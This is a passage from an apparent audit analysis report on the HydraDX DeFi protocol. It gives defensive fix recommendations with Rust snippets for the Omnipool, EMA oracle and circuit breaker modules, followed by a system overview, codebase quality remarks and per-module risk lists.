                                        && Self::is_asset_allowed(pool_id, asset_out, Tradability::BUY),
                                Error::<T>::NotAllowed
                        );


                        ensure!(
                                amount_out >= T::MinTradingLimit::get(),
                                Error::<T>::InsufficientTradingAmount
                        );
```

**Recommendation**

The function should prevent set `asset_in` to be equal to `asset_out`.

### 2. Prevent store prices from `on_trade` function with `amount_a` and `amount_b` equal to zero

Affected code [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/ema-oracle/src/lib.rs#L386-L404).

The `on_trade` function should be called by the `adapter` in order to store the price after a trade has been executed. In order to consider the price comes from a trade is valid, the amount traded should be greater than zero. 

**Recommendation**

The function should check if the `amount_a` and `amount_b` are greater than zero, if not the function should return error. Consider adding this code to `on_trade` function:

```rust

                // We assume that zero liquidity values are not valid and can be ignored.
                if amount_a.is_zero() && amount_b.is_zero() {
                        log::warn!(
                                target: LOG_TARGET,
                                "trade amounts should not be zero. Source: {source:?}, amounts: ({amount_a},{amount_b})"
                        );
                        return Err((Self::on_trade_weight(), Error::<T>::OnTradeValueZero.into()));
                }
```

## Circuit Breaker 

### 1. Should check that the amounts to be added or subtracted are greater than zero before executing the rest of the function and update the values 

Affected code [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/circuit-breaker/src/lib.rs#L485-L516) and [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/circuit-breaker/src/lib.rs#L518-L545).

The functions such as `ensure_and_update_trade_volume_limit`, and `ensure_and_update_add_liquidity_limit`, should make sure that the `amount_out` and `amount_in`, and `liquidity_added` are greater than zero before keeping execution of the code.

```rust 
        fn ensure_and_update_trade_volume_limit(
                asset_in: T::AssetId,
                amount_in: T::Balance,
                asset_out: T::AssetId,
                amount_out: T::Balance,
        ) -> DispatchResult {
                // liquidity in
                // ignore Omnipool's hub asset
                if asset_in != T::OmnipoolHubAsset::get() {
                        let mut allowed_liquidity_range = Pallet::<T>::allowed_trade_volume_limit_per_asset(asset_in)
                                .ok_or(Error::<T>::LiquidityLimitNotStoredForAsset)?;


                        allowed_liquidity_range.update_amounts(amount_in, Zero::zero())?;
                        allowed_liquidity_range.check_limits()?;


                        <AllowedTradeVolumeLimitPerAsset<T>>::insert(asset_in, allowed_liquidity_range);
                }


                // liquidity out
                // ignore Omnipool's hub asset
                if asset_out != T::OmnipoolHubAsset::get() {
                        let mut allowed_liquidity_range = Pallet::<T>::allowed_trade_volume_limit_per_asset(asset_out)
                                .ok_or(Error::<T>::LiquidityLimitNotStoredForAsset)?;


                        allowed_liquidity_range.update_amounts(Zero::zero(), amount_out)?;
                        allowed_liquidity_range.check_limits()?;


                        <AllowedTradeVolumeLimitPerAsset<T>>::insert(asset_out, allowed_liquidity_range);
                }


                Ok(())
        }
```

**Recommendation**

Check that those amounts are not equal to zero.

```rust 
ensure!(
			!amount_out.is_zero() && !amount_in.is_zero(),
			Error::<T>::invalidValues
		);
```

### 2. Potential liquidity addition freeze in Omnipool due to limited add functionality by the circuit breaker

Omnipool enforces a minimum limit of `1,000,000` for both adding and removing liquidity, regardless of the specific asset.

Due to that, there is no `Range` for the limits in the circuit breaker. Considering that the `default_max_add_liquidity_limit` is equal to 5%, the liquidity addition can be frozen by depositing the initial deposit equals to the `MinimumPoolLiquidity`, so if the initial liquidity is `1_000_000`, the max amount to be added in a single block allowed by the circuit breaker is 5000; which is much less than the minimum limit of liquidity set by the omnipool, so the liquidity addition will be frozen. 

**Recommendation**

Set the max limit of adding liquidity of the asset in the circuit breaker to be equal to the minimum liquidity limit of the omnipool if the calculated max limit is below it.

```diff
        fn calculate_and_store_liquidity_limits(asset_id: T::AssetId, initial_liquidity: T::Balance) -> DispatchResult {
                // we don't track liquidity limits for the Omnipool Hub asset
                if asset_id == T::OmnipoolHubAsset::get() {
                        return Ok(());
                }


                // add liquidity
                if let Some(limit) = Pallet::<T>::add_liquidity_limit_per_asset(asset_id) {
                        if !<AllowedAddLiquidityAmountPerAsset<T>>::contains_key(asset_id) {
                                let max_limit = Self::calculate_limit(initial_liquidity, limit)?;
+                 if (max_limit < 1_000_000) {
+                  max_limit = 1_000_000 ; 
+                 }
                                <AllowedAddLiquidityAmountPerAsset<T>>::insert(
                                        asset_id,
                                        LiquidityLimit::<T> {
                                                limit: max_limit,
                                                liquidity: Zero::zero(),
                                        },
                                );
                        }
                }
```

## Overview of the HydraDX Audit

HydraDX is a cutting-edge DeFi protocol designed to enhance liquidity within the `Polkadot` ecosystem. At its core, HydraDX operates as a cross-chain liquidity protocol built on Substrate, offering an open and permissionless platform for users. The protocol functions as a parachain within the `Polkadot` network, enabling native asset swaps within the ecosystem while also facilitating interoperability with other blockchain networks such as Ethereum.

One of the key innovations of `HydraDX` is its Omnipool, which serves as an AMM. Unlike traditional order book-based exchanges, where buyers and sellers create orders that are matched against each other, an AMM like the Omnipool provides liquidity through a single pool where assets are traded against the protocol itself. Liquidity providers contribute assets to the pool and earn rewards in return, helping to maintain liquidity for various trading pairs.

HydraDX addresses several challenges faced by existing `DEX` protocols, such as slippage, impermanent loss, and front-running. To overcome these challenges, `HydraDX` implements several innovative features. The Omnipool consolidates liquidity for all assets into a single pool, reducing slippage and improving trading efficiency. Additionally, the protocol employs an order matching engine connected to the AMM pool via an oracle, allowing for more efficient trade execution. Transaction fees can be paid in any currency, enhancing flexibility for users, and the protocol supports dollar-cost averaging, automating asset purchases at regular intervals regardless of price fluctuations. Looking ahead, HydraDX is exploring additional features such as zkRollups for transaction scalability, resistance mechanisms against front-running, and the introduction of new financial instruments like lending, derivatives, and synthetics. The protocol also utilizes a LBP model to distribute tokens and bootstrap liquidity, ensuring a fair and sustainable ecosystem for users and the community.

## System Overview

### Omnipool

1. **lib.rs**: This contract implements a DEX using an AMM model on the Substrate framework. It allows users to trade assets without intermediaries by pooling liquidity from providers and using on-chain math functions to calculate state changes during operations like `adding/removing` liquidity or executing swaps. Key functions allow managing the assets, positions represented as NFTs, and trades, while adhering to parameters like price barriers and dynamic fees. Precise updates to the pool reserves and hub asset imbalance are performed through hooks and events provide transparency. The non-custodial and low fee nature of the omnipool model enables greater decentralization and accessibility for traders compared to order-book based `HydraDX` alternatives.

   Here's a breakdown of the key functions:

   - **Protocol Account**:
     - `protocol_account()`: Returns the protocol account address, which is used for managing the omnipool's assets.

   - **Asset Management**:
     - `load_asset_state(asset_id)`: Retrieves the state of an asset, including its reserve and tradability.
     - `set_asset_state(asset_id, new_state)`: Sets the new state of an asset.
     - `add_asset(asset_id, state)`: Adds a new asset to the omnipool.
     - `update_asset_state(asset_id, delta)`: Updates the state of an asset with the given delta changes.
     - `remove_asset(asset_id)`: Removes an asset from the omnipool.
     - `allow_assets(asset_in, asset_out)`: Checks if the given assets can be traded based on their tradability.
     - `sell_hub_asset(origin, who, asset_out, amount, limit)`: Swaps hub asset for `asset_out`.
     - `buy_asset_for_hub_asset(origin, who, asset_out, amount, limit)`: Swaps asset for hub asset.
     - `buy_hub_asset(who, asset_in, amount, limit)`: Buys hub asset from the pool.
     - `sell_asset_for_hub_asset(who, asset_in, amount, limit)`: Sells asset for hub asset.

   - **Position Management:**
     - `create_and_mint_position_instance(owner)`: Generates an NFT instance ID and mints an NFT for the position.
     - `set_position(position_id, position)`: Inserts or updates a position with the given data.
     - `load_position(position_id, owner)`: Loads a position and checks its owner.

   - **Other Functions:**
     - `get_hub_asset_balance_of_protocol_account()`: Returns the hub asset balance of the protocol account.
     - `is_hub_asset_allowed(operation)`: Checks if the given operation is allowed for the hub asset.
     - `exists(asset)`: Checks if an asset exists in the omnipool.
     - `process_trade_fee(trader, asset, amount)`: Calls the `on_trade_fee` hook and ensures that no more than the fee amount is transferred.
     - `process_hub_amount(amount, dest)`: Processes the given hub amount by transferring it to the specified destination or burning it if the transfer fails.

2. **types.rs**: The codebase defines types and structures used in an Omnipool.

   Here's a breakdown of the key functions:

   - **Types:**
     - `Balance`: This type represents the balance of an asset and is implemented as a `u128`.
     - `Price`: This type represents the price of an asset and is implemented as a `FixedU128`.
     - `Tradability`: This bitflag type indicates whether an asset can be bought, sold, or have liquidity added or removed.
     - `AssetState`: This type stores the state of an asset in the Omnipool, including its hub reserve, LP shares, protocol shares, weight cap, and tradability.
     - `Position`: This type represents a liquidity position in the Omnipool, including the asset ID, amount added, LP shares owned, and the price at which liquidity was provided.
     - `SimpleImbalance`: This type represents an imbalance, which can be positive or negative.
     - `AssetReserveState`: This type stores the state of an asset reserve, including its reserve, hub reserve, LP shares, protocol shares, weight cap, and tradability.

   - **Functions:**
     - `impl From<AssetReserveState<Balance>> for AssetState<Balance>`: Converts an `AssetReserveState` to an `AssetState`.
     - `impl From<(MathReserveState<Balance>, Permill, Tradability)> for AssetState<Balance>`: Converts a tuple of `MathReserveState`, `Permill`, and `Tradability` to an `AssetState`.
     - `impl From<&Position<Balance, AssetId>> for hydra_dx_math::omnipool::types::Position<Balance>`: Converts a `Position` to a `Position` in the `hydra_dx_math::omnipool::types` module.
     - `impl Position<Balance, AssetId>`: Provides methods to update the position state with delta changes.
     - `impl Add<Balance> for SimpleImbalance<Balance>`: Adds a `Balance` to a `SimpleImbalance`.
     - `impl Sub<Balance> for SimpleImbalance<Balance>`: Subtracts a `Balance` from a `SimpleImbalance`.
     - `impl From<&AssetReserveState<Balance>> for MathReserveState<Balance>`: Converts an `AssetReserveState` to a `MathReserveState`.

     - `impl From<(&AssetState<Balance>, Balance)> for AssetReserveState<Balance>`: Converts a tuple of `AssetState` and `Balance` to an `AssetReserveState`.
     - `impl From<(AssetState<Balance>, Balance)> for AssetReserveState<Balance>`: Converts a tuple of `AssetState` and `Balance` to an `AssetReserveState`.
     - `impl AssetReserveState<Balance>`: Provides methods to calculate the price and weight cap of an asset, and update the asset state with delta changes.

   - **Key Features:**
      - The `Tradability` bitflag provides a convenient way to represent the tradability of an asset.
      - The `SimpleImbalance` type provides a simple way to represent imbalances, which can be positive or negative.
      - The `AssetReserveState` type provides a comprehensive representation of an asset reserve's state in the Omnipool.
      - The `Position` type provides a complete representation of a liquidity position in the Omnipool.
      - The functions provided allow for the conversion between different representations of assets, liquidity positions, and imbalances.

3. **traits.rs**: This contract defines `traits`, `structs`, and implementations facilitating the management of an Omnipool, including hooks for liquidity changes and trades, external price fetching, and enforcing price constraints.

   Here's a breakdown of the key functions:

   - **Traits:**
     - `OmnipoolHooks`: This trait defines hooks that can be implemented to perform custom actions when liquidity is changed or a trade occurs in the Omnipool.
     - `ExternalPriceProvider`: This trait defines an interface for an external price provider that can be used to get the price of an asset pair.
     - `ShouldAllow`: This trait defines a way to validate whether a price change is allowed.

   - **Types:**
     - `AssetInfo`: This type stores information about an asset before and after a liquidity change or trade.
     - `EnsurePriceWithin`: This type implements the `ShouldAllow` trait and ensures that the price of an asset is within a certain range of the current spot price and the external oracle price.

   - **Key Features:**
     - The `OmnipoolHooks` trait provides a way to hook into the Omnipool protocol and perform custom actions when liquidity is changed or a trade occurs.
     - The `ExternalPriceProvider` trait provides a way to get the price of an asset pair from an external source.
     - The `ShouldAllow` trait provides a way to validate whether a price change is allowed.
     - The `EnsurePriceWithin` type implements the `ShouldAllow` trait and ensures that the price of an asset is within a certain range of the current spot price and the external oracle price.

### Omnipool Math

1. **math.rs**: This codebase implements a set of functions for calculating the delta changes in the state of an asset pool when various liquidity-related operations are performed, such as selling, buying, adding liquidity, removing liquidity, and calculating the total value locked (TVL) and cap difference.

## Approach taken in evaluating HydraDX Protocol

Accordingly, I analyzed and audited the subject in the following steps:

### 1. Core Protocol Contract Overview

I focused on thoroughly understanding the codebase and providing recommendations to improve its functionality. The main goal was to take a close look at the important contracts and how they work together in the `HydraDX`.

**Main contracts I looked at:**

I start with the following contracts, which play crucial roles in the HydraDX:

```
omnipool/src/lib.rs
omnipool/src/types.rs
omnipool/src/traits.rs
src/omnipool/math.rs
src/omnipool/types.rs
stableswap/src/lib.rs
stableswap/src/types.rs
src/stableswap/math.rs
src/stableswap/types.rs
ema-oracle/src/lib.rs
ema-oracle/src/types.rs
src/ema/math.rs
circuit-breaker/src/lib.rs
```

I started my analysis by examining the intricate structure and functionalities of the hydrax protocol, particularly focusing on its various modules such as Omnipool, Omnipool Math, and Stableswap. These modules offer a comprehensive suite of features for managing liquidity, trading assets, and maintaining stablecoin pools within the ecosystem. 

In Omnipool, the protocol enables decentralized trading through an Automated Market Maker (AMM) model, facilitating asset swaps without intermediaries. Key functions such as asset management, position management, and trade processing are provided to ensure efficient operation of the liquidity pool. Additionally, the protocol defines types and traits to facilitate the management and interaction with the Omnipool.

The Omnipool Math module offers essential mathematical functions for calculating changes in asset states during various liquidity-related operations. Functions for selling, buying, adding liquidity, removing liquidity, as well as calculating total value locked (TVL) and cap differences, are meticulously implemented to ensure accurate state transitions within the pool. On the other hand, the Stableswap module introduces a Curve-style stablecoin AMM, allowing the creation and management of liquidity pools for stablecoins. With features like pool creation, liquidity addition, removal, and trading, the Stableswap module provides a robust framework for maintaining stablecoin liquidity pools with adjustable parameters such as amplification and trade fees.

### 2. Documentation review

Reviewed [this doc](https://docs.hydradx.io/) for a more detailed and technical explanation of the HydraDX project.

### 3. Compiling code and running provided tests

### 4. Manual code review

In this phase, I initially conducted a line-by-line analysis, following that, I engaged in a comparison mode.
- **Line by Line Analysis**: Pay close attention to the contract's intended functionality and compare it with its actual behavior on a line-by-line basis.
- **Comparison Mode**: Compare the implementation of each function with established standards or existing implementations, focusing on the function names to identify any deviations.

## Codebase Quality

Overall, I consider the quality of the HydraDX protocol codebase to be good. The code appears to be mature and well-developed. We have noticed the implementation of various standards adhere to appropriately. Details are explained below:

**Architecture & Design**: The protocol features a modular design, segregating functionality into distinct contracts (e.g., Omnipool, Stableswap, Oracle) for clarity and ease of maintenance. The use of libraries like Stableswap Math for mathematical operations also indicates thoughtful design choices aimed at optimizing contract performance and gas efficiency.

**Upgradeability & Flexibility**: The project does not explicitly implement upgradeability patterns (e.g., proxy contracts), which might impact long-term maintainability. Considering an upgrade path or versioning strategy could enhance the project's flexibility in addressing future requirements.

**Community Governance & Participation**: The protocol incorporates mechanisms for community governance, enabling token holders to influence decisions. This fosters a decentralized and participatory ecosystem, aligning with the broader ethos of blockchain development.

**Error Handling & Input Validation**: Functions check for conditions and validate inputs to prevent invalid operations, though the depth of validation (e.g., for edge cases transactions) would benefit from closer examination.

**Code Maintainability and Reliability**: The provided contracts are well-structured, exhibiting a solid foundation for maintainability and reliability. Each contract serves a specific purpose within the ecosystem, following established patterns and standards. This adherence to best practices and standards ensures that the code is not only secure but also future-proof. The usage of contracts for implementing token and security features like access control further underscores the commitment to code quality and reliability. However, the centralized control present in the form of admin and owner privileges could pose risks to decentralization and trust in the long term. Implementing decentralized governance or considering upgradeability through proxy contracts could mitigate these risks and enhance overall reliability.

**Code Comments**: The contracts are accompanied by comprehensive comments, facilitating an understanding of the functional logic and critical operations within the code. Functions are described purposefully, and complex sections are elucidated with comments to guide readers through the logic. Despite this, certain areas, particularly those involving intricate mechanics or tokenomics, could benefit from even more detailed commentary to ensure clarity and ease of understanding for developers new to the project or those auditing the code.

**Testing**: The contracts exhibit a commendable level of test coverage, approaching nearly 100%, which is indicative of a robust testing regime. This coverage ensures that a wide array of functionalities and edge cases are tested, contributing to the reliability and security of the code. However, to further enhance the testing framework, the incorporation of fuzz testing and invariant testing is recommended. These testing methodologies can uncover deeper, systemic issues by simulating extreme conditions and verifying the invariants of the contract logic, thereby fortifying the codebase against unforeseen vulnerabilities.

**Code Structure and Formatting**: The codebase benefits from a consistent structure and formatting, adhering to the stylistic conventions and best practices of Solidity programming. Logical grouping of functions and adherence to naming conventions contribute significantly to the readability and navigability of the code. While the current structure supports clarity, further modularization and separation of concerns could be achieved by breaking down complex contracts into smaller, more focused components. This approach would not only simplify individual contract logic but also facilitate easier updates and maintenance.

**Strengths**: Among the notable strengths of the codebase are its adherence to innovative integration of blockchain technology with dex's and stableswaps. The utilization of stableswap libraries for security and standard compliance emphasizes a commitment to code safety and interoperability. The creative use of circuit-breaker/src/lib.rs and src/ema/math.rs in the Dex's mechanics demonstrates.

**Documentation**: The contracts themselves contain comments and some descriptions of functionality, which aids in understanding the immediate logic. It was learned that the project also provides external documentation. However, it has been mentioned that this documentation is somewhat outdated. For a project of this complexity and scope, keeping the documentation up-to-date is crucial for developer onboarding, security audits, and community engagement. Addressing the discrepancies between the current codebase and the documentation will be essential for ensuring that all stakeholders have a clear and accurate understanding of the system's architecture and functionalities.

     - **Numerical Precision**: The contract involves numerous calculations with fixed-point arithmetic and conversions between different numeric representations. Any miscalculations or inaccuracies in these operations could result in incorrect financial outcomes or vulnerabilities to attacks.
     - **Iteration Limits**: The contract imposes limits on the number of iterations for certain iterative calculations (`MAX_Y_ITERATIONS` and `MAX_D_ITERATIONS`). If these limits are set too low, it may lead to premature termination of calculations, potentially resulting in inaccurate results or failed transactions.
     - **Overflow/Underflow**: There are several arithmetic operations throughout the contract (`checked_add`, `checked_sub`, etc.) aimed at preventing overflow or underflow. However, if these checks are inadequate or incorrectly implemented, they could introduce vulnerabilities to arithmetic errors.
     - **Input Validation**: The contract assumes valid input parameters in functions such as `calculate_out_given_in`, `calculate_in_given_out`, etc. Insufficient input validation could lead to unexpected behavior or vulnerabilities such as denial-of-service attacks or manipulation of calculations.

   - **Integration Risks**:
     - **External Dependencies**: The contract relies on external crates and libraries (`num_traits`, `primitive_types`, `sp_arithmetic`, `sp_std`, etc.). Any vulnerabilities or changes in these dependencies could impact the security and functionality of the contract.
     - **Interoperability**: If this contract interacts with other contracts or systems, there could be integration risks associated with data consistency, protocol compatibility, and security vulnerabilities in the interaction mechanisms.

2. **types.rs**:

   - **Systemic Risks**:
     - **Data Loss Risk**: While the contract defines a `is_zero` function to check if the reserve amount is zero, there are no measures in place to prevent or handle data loss or corruption. If reserve amounts are inadvertently set to zero or corrupted, it could lead to unexpected behavior or loss of funds.

   - **Centralization Risks**:
     - **Control over Reserves**: Depending on how the reserve amounts are managed and updated, there could be centralization risks if a small number of entities or controllers have the authority to modify these reserves. Centralized control over reserves could lead to manipulation or misuse, impacting the fairness and integrity of the system.

   - **Technical Risks**:
     - **Data Integrity**: There are no explicit checks or validations to ensure the integrity of reserve amounts or decimals. If reserve amounts are manipulated or set incorrectly, it could lead to incorrect calculations or financial losses.
     - **Data Conversion**: The contract provides conversion functions (`From`) to convert `AssetReserve` instances into `u128` values. However, there are no checks or safeguards to ensure the validity of these conversions, potentially leading to unexpected behavior or errors if used improperly.
     - **Zero Balance Handling**: While the `is_zero` function checks if the reserve amount is zero, there are no explicit error-handling mechanisms if zero balance assets are encountered in calculations. This lack of error handling could lead to unexpected behavior or vulnerabilities in downstream processes or calculations.

   - **Integration Risks**:
     - **Dependency Risks**: The contract relies on external dependencies such as `num_traits`. Any vulnerabilities or changes in these dependencies could impact the security and functionality of the contract.
     - **Interoperability**: If this contract is part of a larger system or interacts with other contracts or systems, there could be integration risks associated with data consistency, protocol compatibility, and security vulnerabilities in the interaction mechanisms.

### EMA Oracle

1. **lib.rs**:

   - **Systemic Risks**:
     - **Data Loss Risk**: There's a potential risk of data loss if the accumulator storage encounters issues during write operations. If data is not properly stored or overwritten, it could lead to inaccuracies or loss of historical information required for calculating oracle values accurately.

   - **Centralization Risks**:
     - **Control over Oracles**: The pallet seems to centralize the aggregation of oracle data, as it accumulates data from various sources into a single accumulator. Depending on how this data aggregation is managed, there could be centralization risks if a small number of entities or controllers have the authority to influence oracle values, potentially leading to manipulation or inaccuracies.

   - **Technical Risks**:
     - **Data Integrity**: The pallet relies on accurate data aggregation and calculation of oracle values. Any bugs or vulnerabilities in the data aggregation logic could lead to incorrect oracle values being reported, impacting the reliability and trustworthiness of the system.
     - **Error Handling**: While error handling is implemented for certain scenarios, such as when liquidity amounts are zero, there might be other potential error scenarios that are not adequately handled, leading to unexpected behavior or vulnerabilities.
     - **Dependency Risks**: The pallet relies on external dependencies such as `frame_support` and `sp_runtime`. Any vulnerabilities or changes in these dependencies could impact the security and functionality of the pallet.

   - **Integration Risks**:
     - **Dependence on Other Pallets**: The pallet relies on data ingestion from other pallets, such as the xyk pallet, through provided callback handlers. Any changes or issues in the integration with these pallets could affect the functionality and accuracy of oracle values reported by this pallet.
     - **Protocol Compatibility**: As the pallet interacts with other modules or systems, there's a risk of compatibility issues or protocol mismatches, especially if the integration requirements or protocols change over time.

2. **types.rs**:

   - **Systemic Risks**:
     - **Dependency on External Systems**: The contract relies on external systems like `hydra_dx_math` and `hydradx_traits` for mathematical operations and trait implementations. Any failure or vulnerability in these dependencies could impact the contract's functionality.
     - **Block Number Dependency**: The contract relies on block numbers for certain operations. Any disruption or inconsistency in block generation could affect the accuracy of data or trigger unexpected behavior.

   - **Centralization Risks**:
     - **Single Source of Truth**: The contract appears to centralize price, volume, and liquidity data. Depending on a single oracle or source for this critical information could lead to manipulation or inaccuracies if the oracle or source is compromised.
     - **Vendor Lock-in**: The contract's dependency on specific libraries (`hydra_dx_math` and `hydradx_traits`) could create a centralization risk if these libraries are controlled by a single entity or if there are limited alternatives available.

   - **Technical Risks**:
     - **Algorithm Complexity**: The contract utilizes complex mathematical algorithms for calculating exponential moving averages and updating oracle entries. Complex algorithms increase the risk of implementation errors, which could lead to incorrect results or vulnerabilities.
     - **Data Type Safety**: The contract uses custom data types (`Price`, `Volume`, `Liquidity`) that may require careful handling to ensure type safety and prevent overflow or underflow vulnerabilities.
     - **External Call Dependence**: The contract may rely on external calls to retrieve data or perform calculations. Dependency on external calls introduces risks such as network congestion, oracle failures, or malicious data feeds.

   - **Integration Risks**:
     - **Compatibility Issues**: Integrating this contract with other systems or smart contracts may pose compatibility challenges due to its reliance on specific libraries and data structures.
     - **Versioning Concerns**: Changes to external dependencies or upgrades to the contract itself may introduce versioning conflicts or compatibility issues when integrating with existing systems.
     - **Oracle Integration**: The contract's functionality heavily depends on oracle entries. Integrating with different oracles or upgrading the oracle system may require careful consideration and testing to ensure seamless integration and data consistency.

### EMA Oracle Math

1. **math.rs**:
   Here's an analysis of the provided contract for systemic risks, centralization risks, technical risks, and integration risks:

   - **Systemic Risks**:
     - **Precision Loss**: The contract performs arithmetic operations on rational numbers (`EmaPrice`, `EmaVolume`, `EmaLiquidity`) with limited precision. Precision loss during calculations could lead to inaccuracies in the oracle values, especially over multiple iterations or when dealing with large numbers.
     - **Iteration Dependency**: Certain functions in the contract, such as `iterated_price_ema` and `iterated_balance_ema`, rely on the number of iterations (`u32`) to calculate exponential moving averages. Dependency on iteration count introduces risks if iterations are miscounted or inconsistent, leading to incorrect results.

   - **Centralization Risks**:
     - **Dependency on External Libraries**: The contract depends on external libraries (`crate::fraction`, `crate::support`, `crate::transcendental`) for arithmetic operations and utility functions. Centralization risks arise if these libraries are controlled by a single entity or if there are limited alternatives available.
     - **Single Source of Truth**: The contract centralizes oracle calculations for price, volume, and liquidity. Depending on a single source for critical calculations could lead to manipulation or inaccuracies if the source is compromised.

   - **Integration Risks**:
     - **Arithmetic Overflows**: The contract performs arithmetic operations on large numbers (`U512`) and may be susceptible to arithmetic overflow or underflow vulnerabilities if not handled properly. Saturating operations are used to mitigate this risk, but thorough testing is required to ensure correctness.
     - **Precision Handling**: The contract uses shifting and rounding techniques to handle precision reduction. Mishandling precision reduction could lead to incorrect results or unexpected behavior, especially in edge cases or under extreme conditions.
     - **Complex Arithmetic Logic**: The contract contains complex arithmetic logic for weighted averaging and exponential moving average calculations. Complex logic increases the risk of implementation errors, making the contract harder to maintain and debug.

   - **Integration Risks**:
     - **Compatibility Challenges**: Integrating this contract with other systems or smart contracts may pose compatibility challenges due to its reliance on specific external libraries and data structures. Ensuring compatibility and consistency across different environments may require additional effort and testing.
     - **External Dependency Management**: The contract relies on external dependencies for arithmetic operations and utility functions. Managing these dependencies, including versioning and updates, could introduce integration risks if not handled properly.
     - **Interoperability Concerns**: Interacting with this contract from other smart contracts or systems may require careful consideration of data types and precision handling to ensure seamless integration and data consistency.

### Circuit breaker

1. **lib.rs**:

   - **Systemic Risks**:
     - **Arithmetic Errors**: The contract performs arithmetic operations like addition, subtraction, multiplication, and division on balance types (`T::Balance`). Errors like overflow, underflow, and division by zero can lead to systemic risks if not handled properly, potentially disrupting the functioning of the entire system.

   - **Centralization Risks**:
     - **Whitelisted Accounts**: Certain accounts specified in `type WhitelistedAccounts` bypass checks for adding/removing liquidity. Centralizing control over these accounts poses centralization risks as they can influence liquidity operations without standard checks, potentially favoring specific entities and impacting the fairness of the system.

   - **Integration Risks**:
     - **Origin Permissions**: The contract relies on the `TechnicalOrigin` to ensure the origin of certain calls. Technical permissions are crucial for maintaining the integrity of the system, but incorrect or insufficient origin checks can lead to technical risks such as unauthorized access or manipulation of critical parameters.

   - **Integration Risks**:
     - **External Contract Integration**: If this contract interacts with external contracts or systems, integration risks may arise. These risks include vulnerabilities in the external interfaces, dependencies on external systems' availability and correctness, and the potential for unforeseen interactions impacting the contract's behavior and security.
